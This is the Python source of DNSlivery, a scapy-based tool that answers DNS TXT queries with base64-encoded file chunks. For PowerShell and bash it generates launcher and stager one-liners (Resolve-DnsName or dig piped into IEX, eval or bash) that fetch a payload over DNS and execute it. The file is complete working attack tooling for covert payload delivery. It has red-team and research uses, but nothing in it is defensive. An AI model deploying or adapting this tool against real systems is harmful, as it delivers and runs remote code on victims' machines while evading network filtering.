#! /usr/bin/env python3

import sys
import os
import argparse
import signal
import re
import base64
from scapy.all import *

banner = """
DNSlivery - Easy files and payloads delivery over DNS via TXT records
"""

def log(message, msg_type=''):
    reset = '\033[0;m'

    # set default prefix and color
    prefix = '[*]'
    color = reset

    # change prefix and color based on msg_type
    if msg_type == '+':
        prefix = '[+]'
        color = '\033[1;32m'
    elif msg_type == '-':
        prefix = '[-]'
        color = '\033[1;31m'
    elif msg_type == 'debug':
        prefix = '[DEBUG]'
        color = '\033[0;33m'

    print('%s%s %s%s' % (color, prefix, message, reset))

def base64_chunks(clear, size):
    encoded = base64.b64encode(clear)

    # split base64 into chunks of provided size
    encoded_chunks = []
    for i in range(0, len(encoded), size):
        encoded_chunks.append(encoded[i:i + size])

    return encoded_chunks

def signal_handler(signal, frame):
    log('Exiting...')
    sys.exit(0)

def dns_handler(data, target):
    # only process dns queries
    if data.haslayer(IP) and data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
        # split packet layers
        ip = data.getlayer(IP)
        udp = data.getlayer(UDP)
        dns = data.getlayer(DNS)
        dnsqr = data.getlayer(DNSQR)

        # only process txt queries (type 16)
        if len(dnsqr.qname) != 0 and dnsqr.qtype == 16:
            if args.verbose:
                log('Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))

            # remove domain part of fqdn and split the different parts of hostname
            hostname = re.sub(r'\.%s\.$' % re.escape(args.domain), '', dnsqr.qname.decode()).split('.')

            # check if hostname matches an existing file
            if len(hostname) > 0 and hostname[0] in chunks:
                # launcher response (default): file.domain
                if len(hostname) == 1:
                    hostname.append('print')

                # launcher response: file.stager.domain
                if len(hostname) == 2 and hostname[1] in ['print', 'exec', 'save']:
                    response = launcher_template % (len(stagers[hostname[0]][hostname[1]]), hostname[0], hostname[1], args.domain)
                     # Base64 encode the response for the bash target
                    if target == 'bash':
                        response = "echo " + base64.b64encode(response.encode()).decode() + " | base64 -d"

                    log('Delivering %s %s launcher to %s' % (hostname[0], hostname[1], ip.src), '+')

                # stager response: file.stager.i.domain
                elif len(hostname) == 3 and hostname[2].isdecimal() and int(hostname[2]) > 0 and int(hostname[2]) <= len(stagers[hostname[0]][hostname[1]]):
                    response = stagers[hostname[0]][hostname[1]][int(hostname[2]) - 1]
                    log('Delivering %s %s stager %s/%d to %s' % (hostname[0], hostname[1], int(hostname[2]), len(stagers[hostname[0]][hostname[1]]), ip.src), '+')

                # base64 chunk response: file.i
                elif len(hostname) > 1 and hostname[1].isdecimal() and int(hostname[1]) > 0 and int(hostname[1]) <= len(chunks[hostname[0]]):
                    response = chunks[hostname[0]][int(hostname[1]) - 1]
                    log('Delivering %s chunk %s/%d to %s' % (hostname[0], int(hostname[1]), len(chunks[hostname[0]]), ip.src), '+')

                else:
                    log(f"Hostname '{hostname}' did not match expected patterns for target '{target}'", 'debug')
                    return

                # build response packet
                rdata = response
                rcode = 0
                dn = args.domain
                an = (None, DNSRR(rrname=dnsqr.qname, type='TXT', rdata=rdata, ttl=1))[rcode == 0]
                ns = DNSRR(rrname=dnsqr.qname, type='NS', ttl=60, rdata=args.nameserver)

                response_pkt = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
                send(response_pkt, verbose=0, iface=args.interface)

if __name__ == '__main__':
    # parse args
    parser = argparse.ArgumentParser(description=banner)
    parser.add_argument('interface', default=None, help='interface to listen to DNS traffic')
    parser.add_argument('domain', default=None, help='FQDN name of the DNS zone')
    parser.add_argument('nameserver', default=None, help='FQDN name of the server running DNSlivery')
    parser.add_argument('-p', '--path', default='.', help='path of directory to serve over DNS (default: pwd)')
    parser.add_argument('-s', '--size', default='255', help='size in bytes of base64 chunks (default: 255)')
    parser.add_argument('-v', '--verbose', action='store_true', help='increase verbosity')
    parser.add_argument('-t', '--target', choices=['powershell', 'bash'], default='powershell', help='target language for stagers (default: powershell)')
    args = parser.parse_args()

    print('%s' % banner)

    # verify root
    if os.geteuid() != 0:
        log('Script needs to be run with root privileges to listen for incoming udp/53 packets', '-')
        sys.exit(-1)

    # verify path exists and is readable
    abspath = os.path.abspath(args.path)

    if not os.path.exists(abspath) or not os.path.isdir(abspath):
        log('Path %s does not exist or is not a directory' % abspath, '-')
        sys.exit(-1)

    # list files in path
    filenames = {}
    for root, dirs, files in os.walk(abspath):
        for name in files:
            filenames[name] = ''
        break

    # for each file, sanitize filename compute chunks and generate stagers (main file processing loop)
    chunks = {}
    stagers = {}

    for name in filenames:
        # sanitize filenames to be hostname-compliant (64 max, 254 fqdn max, [a-z0-9\-])
        sanitized = re.sub(r'[^\x00-\x7F]', '', name)  # remove non-ascii chars
        sanitized = sanitized.lower()  # lower all chars
        sanitized = re.sub(r'[^a-z0-9\-]', '-', sanitized)  # replace chars outside charset to '-'
        filenames[name] = sanitized

        # verify args.size is decimal
        if not args.size.isdecimal():
            log('Incorrect size value for base64 chunks', '-')
            sys.exit(-1)

        size = int(args.size)

        try:
            # compute base64 chunks of files
            with open(os.path.join(abspath, name), 'rb') as f:
                chunks[filenames[name]] = base64_chunks(f.read(), size)

        except:
            # remove key from dict in case of failure (e.g. file permissions)
            del filenames[name]
            log('Error computing base64 for %s, file will been ignored' % name, '-')
            continue

        if args.target == 'powershell':

            # launcher and stagers template definition

            launcher_template = 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na "%s.%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}))))'

            stager_templates = {
                'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
                'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)}))))',
                'save': '[IO.File]::WriteAllBytes("$(Get-Location)\\%s",[System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))'
            }

            # generate stagers
            stagers[filenames[name]] = {}
            stagers[filenames[name]]['print'] = base64_chunks(bytearray(stager_templates['print'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
            stagers[filenames[name]]['exec'] = base64_chunks(bytearray(stager_templates['exec'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
            stagers[filenames[name]]['save'] = base64_chunks(bytearray(stager_templates['save'] % (name, len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)

            # display file ready for delivery
            log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))

            # Print lookup template for each type exec, print, and save
            lookup_templates_pwsh = {
                'print': "Resolve-DnsName -ty TXT -na \"%s.print.%s\" | Select-Object -Exp Strings",
                'exec': "Resolve-DnsName -ty TXT -na \"%s.exec.%s\" | Select-Object -Exp Strings",
                'save': "Resolve-DnsName -ty TXT -na \"%s.save.%s\" | Select-Object -Exp Strings"
            }

            lookup_templates_nslookup = {
                'print': "nslookup -q=TXT %s.print.%s %s",
                'exec': "nslookup -q=TXT %s.exec.%s %s",
                'save': "nslookup -q=TXT %s.save.%s %s"
            }

            for key in lookup_templates_pwsh:
                log('Lookup %s (Resolve-DNSName): %s' % (key.upper(), lookup_templates_pwsh[key] % (filenames[name], args.domain)), 'debug')
                log('Lookup %s (nslookup): %s' % (key.upper(), lookup_templates_nslookup[key] % (filenames[name], args.domain, args.nameserver)), 'debug')

        elif args.target == 'bash':
            # launcher and stagers template definition for bash
            launcher_template = 'eval $(echo $(for i in $(seq 1 %d); do dig +short %s.%s.$i.%s TXT | tr -d "\\n"; done) | tr -d "\\"" | base64 -d)'

            stager_templates = {
                'print': 'echo $(for i in $(seq 1 %d); do dig +short %s.$i.%s TXT | tr -d "\\n"; done) | tr -d "\\"" | base64 -d',
                'exec': 'eval $(echo $(for i in $(seq 1 %d); do dig +short %s.$i.%s TXT | tr -d "\\n"; done) | tr -d "\\"" | base64 -d)',
                'save': 'echo $(for i in $(seq 1 %d); do dig +short %s.$i.%s TXT | tr -d "\\n"; done) | tr -d "\\"" | base64 -d > %s'
            }

            
            stagers[filenames[name]] = {}
            stagers[filenames[name]]['print'] = base64_chunks(bytearray(stager_templates['print'] % (len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
            stagers[filenames[name]]['exec'] = base64_chunks(bytearray(stager_templates['exec'] % (len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
            stagers[filenames[name]]['save'] = base64_chunks(bytearray(stager_templates['save'] % (len(chunks[filenames[name]]), filenames[name], args.domain, filenames[name]), 'utf-8'), size)

            
            # display file ready for delivery
            log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))

            # Print lookup template for each type exec, print, and save
            lookup_templates = {
                'print': "dig +short -t txt %s.print.%s",
                'exec': "dig +short -t txt %s.exec.%s",
                'save': "dig +short -t txt %s.save.%s"
            }

            for key in lookup_templates:
                log('Lookup %s: %s' % (key.upper(), lookup_templates[key] % (filenames[name], args.domain)), 'debug')


            lookup_templates_oneliner = {
                'print': "eval $(dig +short -t txt %s.print.%s |tr -d \"\\\"\" | bash)",
                'exec': "eval $(dig +short -t txt %s.exec.%s |tr -d \"\\\"\" | bash)",
                'save': "eval $(dig +short -t txt %s.save.%s |tr -d \"\\\"\" | bash)"
            }

            for key in lookup_templates_oneliner:
                log('Lookup One-Liner %s: %s' % (key.upper(), lookup_templates_oneliner[key] % (filenames[name], args.domain)), 'debug')

        else:
            log('Unknown target %s' % args.target, '-')
            sys.exit(-1)

    # register signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # listen for DNS query
    log('Listening for DNS queries...')

    sniff(filter='udp dst port 53', iface=args.interface, prn=lambda data: dns_handler(data, args.target))
